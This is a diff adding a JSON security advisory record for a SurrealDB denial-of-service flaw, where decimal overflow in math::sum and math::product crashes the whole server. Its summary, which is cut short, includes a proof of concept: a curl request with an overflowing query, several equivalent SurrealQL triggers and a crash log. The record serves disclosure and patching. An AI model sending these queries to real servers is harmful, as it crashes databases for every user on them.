@@ -1,0 +1,51 @@
+{
+  "id": "GHSA-g422-fj9r-m92g",
+  "aliases": [],
+  "title": "Server crash (DoS) via decimal overflow in math::sum / math::product",
+  "summary": "### Summary\r\n\r\nAn uncaught arithmetic overflow in the `math::sum` and `math::product` aggregate functions lets any user who can run a single query terminate the entire SurrealDB server process. When the running total of a `decimal` accumulation exceeds the `decimal` range, the worker thread panics inside `rust_decimal` instead of returning an error, and the process exits (status 133). Every connection, database and namespace on the instance goes down with it. No special privileges, no large dataset, and no stored data are required - the overflowing values can be literals in the query. Confirmed on `3.2.4` and `3.1.2`.\r\n\r\n### Details\r\n\r\n`math::sum` and `math::product` accumulate their arguments using unchecked `decimal` arithmetic. When an intermediate result exceeds the `decimal` maximum (`79228162514264337593543950335`), the addition panics rather than returning a `Result::Err`, and the panic aborts the SurrealDB worker thread, which terminates the whole server process.\r\n\r\nThe engine already has a correct, recoverable path for exactly this condition:\r\n\r\n- The `+` and `*` **operators** on the same operands return a normal query error  (`Cannot perform addition with '...' and '...'`).\r\n- `math::mean`, which also sums internally, returns that same error rather than panicking.\r\n\r\nSo only the `math::sum` / `math::product` accumulation escalates an out-of-range decimal to a process-killing panic. The fix is to have these functions use the same checked arithmetic the operators and `math::mean` already use.\r\n\r\nSource pointer for the maintainer:\r\nThe chain, with line numbers from `main` at commit `18971ffba` (the 3.1.x / 3.2.x release tags differ by a few lines but the structure is identical):\r\n\r\n- `surrealdb/core/src/fnc/math.rs:218` - `math::sum`:\r\n  ```rust\r\n  pub fn sum((array,): (Vec<Number>,)) -> Result<Value> {\r\n      Ok(array.into_iter().sum::<Number>().into())\r\n  }\r\n  ```\r\n  and `:182` - `math::product` via `product::<Number>()`.\r\n- `surrealdb/core/src/val/number.rs:1160` - `impl Sum for Number` folds with the plain operator:\r\n  `iter.fold(Number::Int(0), |a, b| a + b)` (and `:1178`, `Product`, folds with `*`).\r\n- `surrealdb/core/src/val/number.rs:1034` - `impl ops::Add for Number`, whose decimal arm is **unchecked**:\r\n  ```rust\r\n  (Number::Decimal(v), Number::Decimal(w)) => Number::Decimal(v + w),\r\n  ```\r\n  `v + w` here is `rust_decimal`'s `Decimal + Decimal`, which panics on overflow - the frame in the crash log is `rust_decimal-1.42.0/src/arithmetic_impls.rs:161:18`,  `Addition overflowed`.\r\n\r\n\r\n\r\n### PoC\r\n\r\nStart a server with the in-memory backend (any 3.1.x / 3.2.x build):\r\n\r\n```bash\r\nsurreal start --user root --pass root memory\r\n```\r\n\r\nSend a single statement over the HTTP `/sql` endpoint:\r\n\r\n```bash\r\ncurl -s -u root:root \\\r\n  -H 'Accept: application/json' -H 'surreal-ns: t' -H 'surreal-db: t' \\\r\n  -X POST --data 'RETURN math::sum([40000000000000000000000000000dec, 40000000000000000000000000000dec]);' \\\r\n  http://localhost:8000/sql\r\n```\r\n\r\nThe connection is dropped with no query result. The server log shows:\r\n\r\n```\r\nthread 'surrealdb-worker' (8) panicked at .../rust_decimal-1.42.0/src/arithmetic_impls.rs:161:18:\r\nAddition overflowed\r\n```\r\n\r\nand the process exits with status 133. Any subsequent request to the same server fails\r\n(the process is gone).\r\n\r\nEquivalent triggers, all fatal:\r\n\r\n```surql\r\nRETURN math::sum([79228162514264337593543950335dec, 1dec]);   -- decimal max + 1\r\nRETURN math::sum([79228162514264337593543950335dec, 1]);      -- mixed int addend\r\nRETURN math::sum([-40000000000000000000000000000dec, -40000000000000000000000000000dec]);\r\nRETURN math::product([40000000000000000000000000000dec, 2dec]);\r\n```\r\n\r\nReachable through ordinary aggregation, so a routine reporting query over a table holding\r\nlarge decimals is an accidental trigger:\r\n\r\n```surql\r\nCREATE t:1 SET v = 40000000000000000000000000000dec;\r\nCREATE t:2 SET v = 40000000000000000000000000000dec;\r\nSELECT math::sum(v) AS s FROM t GROUP ALL;   -- se...",
+  "published_at": "2026-11-03T15:51:15.000Z",
+  "modified_at": "2026-11-03T15:51:15.000Z",
+  "severity": {
+    "level": "medium",
+    "score": 6.5,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-190",
+    "CWE-248"
+  ],
+  "affected": [
+    {
+      "product": "surrealdb",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "4.0.0"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/surrealdb/surrealdb/security/advisories/GHSA-g422-fj9r-m92g",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-g422-fj9r-m92g",
+      "url": "https://github.com/surrealdb/surrealdb/security/advisories/GHSA-g422-fj9r-m92g",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:026699b15cb05368349567c04a07a99cbf01c02c67d0983277f3ebc746d927cc",
+  "note": null
+}
